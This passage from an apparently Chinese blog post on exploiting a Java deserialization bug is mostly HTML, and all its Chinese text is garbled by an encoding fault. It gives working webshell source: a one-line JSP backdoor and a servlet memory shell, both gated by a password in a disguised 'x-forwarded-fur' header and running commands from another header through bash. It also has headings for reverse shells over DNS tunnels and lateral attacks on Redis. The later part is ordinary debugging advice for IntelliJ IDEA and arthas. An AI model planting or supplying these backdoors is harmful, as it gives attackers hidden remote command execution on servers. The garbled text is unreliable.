</span></span></code></pre></td></tr></table></div></div><h3 id=æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤>æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤<a hidden class=anchor aria-hidden=true href=#æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤>#</a></h3><h3 id=å›æ˜¾æ‰§è¡Œå‘½ä»¤>å›æ˜¾æ‰§è¡Œå‘½ä»¤<a hidden class=anchor aria-hidden=true href=#å›æ˜¾æ‰§è¡Œå‘½ä»¤>#</a></h3><h3 id=æ³¨å…¥å†…å­˜é©¬>æ³¨å…¥å†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#æ³¨å…¥å†…å­˜é©¬>#</a></h3><h3 id=å¸è½½æ›´æ–°å†…å­˜é©¬>å¸è½½/æ›´æ–°å†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#å¸è½½æ›´æ–°å†…å­˜é©¬>#</a></h3><h3 id=æœºå™¨ä¸å‡ºç½‘æ—¶å¤ç”¨dnséš§é“åå¼¹shell>æœºå™¨ä¸å‡ºç½‘æ—¶å¤ç”¨DNSéš§é“åå¼¹shell<a hidden class=anchor aria-hidden=true href=#æœºå™¨ä¸å‡ºç½‘æ—¶å¤ç”¨dnséš§é“åå¼¹shell>#</a></h3><h3 id=æ¨ªå‘æ”»å‡»å†…ç½‘redis>æ¨ªå‘æ”»å‡»å†…ç½‘Redis<a hidden class=anchor aria-hidden=true href=#æ¨ªå‘æ”»å‡»å†…ç½‘redis>#</a></h3><h2 id=ä¸€äº›æœ¨é©¬>ä¸€äº›æœ¨é©¬<a hidden class=anchor aria-hidden=true href=#ä¸€äº›æœ¨é©¬>#</a></h2><h3 id=æ™®é€šjspæœ¨é©¬>æ™®é€šJSPæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#æ™®é€šjspæœ¨é©¬>#</a></h3><p>é€šè¿‡è¯·æ±‚å¤´ä¼ é€’å¯†ç å’Œå‘½ä»¤ï¼Œé€šè¿‡å“åº”æ‰“å°å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-118-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-118-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;% if(&#34;p4ssw0rd!&#34;.equals(request.getHeader(&#34;x-forwarded-fur&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{&#34;bash&#34;,&#34;-c&#34;,request.getHeader(&#34;x-forwarded-far&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&#34;&lt;pre&gt;&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&#34;&lt;/pre&gt;&#34;); } %&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=åŠ å¯†æµé‡jspæœ¨é©¬>åŠ å¯†æµé‡JSPæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#åŠ å¯†æµé‡jspæœ¨é©¬>#</a></h3><p>å¾…éœ€è¦æ—¶å®ç°ã€‚æ€è·¯å¾ˆç®€å•ï¼Œåªè¦å°†å¼‚æˆ–ã€base64ç¼–ç ã€rot13ã€AESåŠ å¯†ç­‰çš„è¿›è¡Œæ’åˆ—ç»„åˆå³å¯ã€‚</p><h3 id=æ™®é€šå†…å­˜é©¬>æ™®é€šå†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#æ™®é€šå†…å­˜é©¬>#</a></h3><p>é€šè¿‡è¯·æ±‚å¤´ä¼ é€’å¯†ç å’Œå‘½ä»¤ï¼Œé€šè¿‡å“åº”æ‰“å°å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=åŠ å¯†æµé‡å†…å­˜é©¬>åŠ å¯†æµé‡å†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#åŠ å¯†æµé‡å†…å­˜é©¬>#</a></h3><p>å¾…éœ€è¦æ—¶å®ç°ã€‚æ€è·¯å¾ˆç®€å•ï¼Œåªè¦å°†å¼‚æˆ–ã€base64ç¼–ç ã€rot13ã€AESåŠ å¯†ç­‰çš„è¿›è¡Œæ’åˆ—ç»„åˆå³å¯ã€‚</p><h2 id=ä¿®å¤>ä¿®å¤<a hidden class=anchor aria-hidden=true href=#ä¿®å¤>#</a></h2><h1 id=è°ƒè¯•æŠ€å·§å’Œå¸¸è§é—®é¢˜>è°ƒè¯•æŠ€å·§å’Œå¸¸è§é—®é¢˜<a hidden class=anchor aria-hidden=true href=#è°ƒè¯•æŠ€å·§å’Œå¸¸è§é—®é¢˜>#</a></h1><p>è¿™æ˜¯ç¬”è€…ç¬¬ä¸€æ¬¡ç›¸å¯¹æ·±å…¥åœ°è°ƒè¯•å’Œåˆ©ç”¨å®ç”¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­é¢†æ‚Ÿæˆ–å­¦ä¹ åˆ°äº†ä¸€äº›æœ‰ç”¨çš„çŸ¥è¯†ã€æ–¹æ³•å’ŒæŠ€å·§ï¼Œä¸€å¹¶æ€»ç»“åœ¨æ­¤ï¼Œä»¥é£¨æœ‰éœ€è¦çš„è¯»è€…ã€‚</p><h2 id=é‡ç½®åˆ°è°ƒç”¨æ ˆæŸä¸ªæ ˆå¸§>é‡ç½®åˆ°è°ƒç”¨æ ˆæŸä¸ªæ ˆå¸§<a hidden class=anchor aria-hidden=true href=#é‡ç½®åˆ°è°ƒç”¨æ ˆæŸä¸ªæ ˆå¸§>#</a></h2><p>è·Ÿè¸ªè°ƒè¯•æ—¶æœ‰æ—¶ä¼šèµ°è¿‡å¤´ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨æ ˆå›æº¯æ¥åˆ°ä¹‹å‰çš„æŸä¸ªæ ˆå¸§ï¼Œæ¢å¤åˆ°å½“æ—¶çš„æ‰§è¡ŒçŠ¶æ€ï¼Œé‡æ–°åˆ†æã€‚</p><p>å›åˆ°ä¸Šä¸€çº§è°ƒç”¨ï¼š</p><p><img loading=lazy src=image-20220711094424698.png alt=image-20220711094424698></p><p>å›åˆ°ä¹‹å‰ä»»æ„ä¸€çº§çš„è°ƒç”¨ï¼š</p><p><img loading=lazy src=image-20220711094644529.png alt=image-20220711094644529></p><p>æœ‰äº›ç‰ˆæœ¬çš„ideaä¸­è¿™ä¸ªåŠŸèƒ½é€šè¿‡ç‚¹å‡»æ ˆä¿¡æ¯å‰é¢çš„ç®­å¤´å®ç°ï¼š</p><p><img loading=lazy src=image-20220711094835694.png alt=image-20220711094835694></p><h2 id=å¼‚å¸¸æ–­ç‚¹å¦‚ä½•åº”å¯¹ä»æ²¡æœ‰äººé‡åˆ°è¿‡çš„æŠ¥é”™>å¼‚å¸¸æ–­ç‚¹ï¼šå¦‚ä½•åº”å¯¹ä»æ²¡æœ‰äººé‡åˆ°è¿‡çš„æŠ¥é”™<a hidden class=anchor aria-hidden=true href=#å¼‚å¸¸æ–­ç‚¹å¦‚ä½•åº”å¯¹ä»æ²¡æœ‰äººé‡åˆ°è¿‡çš„æŠ¥é”™>#</a></h2><p>è°ƒè¯•æœ‰æ—¶å€™ä¼šèµ°åˆ°äººè¿¹ç½•è‡³çš„åœ°æ–¹ï¼Œå¦‚æœé‡åˆ°ä¸€ä¸ªæœç´¢å¼•æ“æ— æ³•ç»™å‡ºæ»¡æ„ç­”å¤çš„æŠ¥é”™ï¼ˆæ¯”å¦‚ <code>java.lang.NoClassDefFoundError</code> ï¼‰ï¼Œæˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå¼•èµ·çš„ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆè§£å†³ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥æ ¹æ®è¿™ä¸ªæŠ¥é”™çš„å¼‚å¸¸ä¿¡æ¯ä¸‹åˆé€‚çš„å¼‚å¸¸æ–­ç‚¹ï¼Œç„¶åå¤ç°æŠ¥é”™ï¼Œè§‚å¯Ÿå †æ ˆã€‚</p><p>æ¯”å¦‚åœ¨è°ƒè¯•åˆ†æ->å»é™¤Remotableæ¥å£ç« èŠ‚ä¸­ï¼Œå°±æ˜¯é€šè¿‡ä¸‹å¼‚å¸¸æ–­ç‚¹ <code>java.lang.NoClassDefFoundError</code> å¿«é€Ÿé‡ç°å’Œåˆ†ææŠ¥é”™çš„ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zed data-lang=zed><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> * Thrown if the Java Virtual Machine or a &lt;code&gt;ClassLoader&lt;/code&gt; instance
</span></span></span><span style=display:flex><span><span style=color:#75715e> * tries to load in the definition of a class (as part of a normal method call
</span></span></span><span style=display:flex><span><span style=color:#75715e> * or as part of creating a new instance using the &lt;code&gt;new&lt;/code&gt; expression)
</span></span></span><span style=display:flex><span><span style=color:#75715e> * and no definition of the class could be found.
</span></span></span><span style=display:flex><span><span style=color:#75715e> * &lt;p&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e> * The searched-for class definition existed when the currently
</span></span></span><span style=display:flex><span><span style=color:#75715e> * executing class was compiled, but the definition can no longer be
</span></span></span><span style=display:flex><span><span style=color:#75715e> * found.
</span></span></span><span style=display:flex><span><span style=color:#75715e> *
</span></span></span><span style=display:flex><span><span style=color:#75715e> * @author  unascribed
</span></span></span><span style=display:flex><span><span style=color:#75715e> * @since   JDK1.0
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=æ¡ä»¶æ–­ç‚¹é™åˆ¶æ–­ç‚¹è§¦å‘åœºæ™¯å‡å°‘å¹²æ‰°ä¿¡æ¯>æ¡ä»¶æ–­ç‚¹ï¼šé™åˆ¶æ–­ç‚¹è§¦å‘åœºæ™¯å‡å°‘å¹²æ‰°ä¿¡æ¯<a hidden class=anchor aria-hidden=true href=#æ¡ä»¶æ–­ç‚¹é™åˆ¶æ–­ç‚¹è§¦å‘åœºæ™¯å‡å°‘å¹²æ‰°ä¿¡æ¯>#</a></h2><p>æœ‰äº›æ–­ç‚¹çš„è§¦å‘é¢‘ç‡éå¸¸é«˜ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†è§¦å‘æƒ…å†µéƒ½å¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€å…³å¿ƒçš„ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨æ¡ä»¶æ–­ç‚¹æ¥å‡å°‘å¹²æ‰°ä¿¡æ¯ã€‚å¼‚å¸¸æ–­ç‚¹å’Œæ–¹æ³•æ–­ç‚¹éƒ½æ”¯æŒä½¿ç”¨æ¡ä»¶æ¥ç­›é€‰ã€‚</p><p>ä¾‹å¦‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>æ–­ç‚¹
</span></span><span style=display:flex><span>	java.lang.ClassNotFoundException
</span></span><span style=display:flex><span>æ¡ä»¶
</span></span><span style=display:flex><span>	this.detailMessage.contains(&#34;internal.util.invoke.Remotable&#34;)
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220708172135011.png alt=image-20220708172135011></p><h2 id=evaluate-expressionåŠŸèƒ½>Evaluate ExpressionåŠŸèƒ½<a hidden class=anchor aria-hidden=true href=#evaluate-expressionåŠŸèƒ½>#</a></h2><p>ideaæä¾›çš„Evaluate ExpressionåŠŸèƒ½ï¼ˆå¿«æ·é”®Alt+f8ï¼‰å¯ä»¥è®©æˆ‘ä»¬åœ¨è°ƒè¯•çš„æ—¶å€™åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä¸€äº›Javaä»£ç ï¼Œæµ‹è¯•ä¸€äº›è¡¨è¾¾å¼å¹¶è·å¾—ç»“æœï¼Œè§‚å¯Ÿä¸€äº›å˜é‡çš„å€¼ï¼Œæ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œæœ¬æ–‡å·²åœ¨å¤šå¤„å±•ç¤ºäº†å®ƒçš„ç”¨æ³•ã€‚</p><p><img loading=lazy src=image-20220712114308548.png alt=image-20220712114308548></p><h2 id=å¦‚ä½•ç¡®å®šjvmä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»>å¦‚ä½•ç¡®å®šJVMä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#å¦‚ä½•ç¡®å®šjvmä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»>#</a></h2><p>ååºåˆ—åŒ–gadgetè·³è½¬æœ‰æ—¶ä¼šæŠ¥æ‰¾ä¸åˆ°ç±»çš„é”™è¯¯ï¼Œè¿™ä¸ªé”™è¯¯å¾€å¾€æ˜¯nativeå±‚ä»£ç æŠ¥å‡ºæ¥çš„ï¼Œä¸èƒ½éå¸¸æ˜ç¡®è®¤å®šæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¼šæƒ³è¦çŸ¥é“JVMä¸­æ˜¯å¦åŠ è½½äº†æˆ‘ä»¬éœ€è¦çš„ç±»ã€‚ä¸€ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·æ˜¯arthasï¼Œå®ƒå…è®¸æˆ‘ä»¬attachåˆ°Javaè¿›ç¨‹ä¸Šå¹¶åœ¨å…¶ä¸­æ¢ç´¢ï¼Œåœ¨JVMå†…å­˜ä¸­è¿›è¡Œæœ‰é™åˆ¶çš„å¢åˆ æ”¹æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨arthasæ¥ç¡®å®šJVMä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»ã€‚</p><p>å‚è€ƒï¼šhttps://arthas.aliyun.com/doc/en/quick-start.html</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-7>7</a>
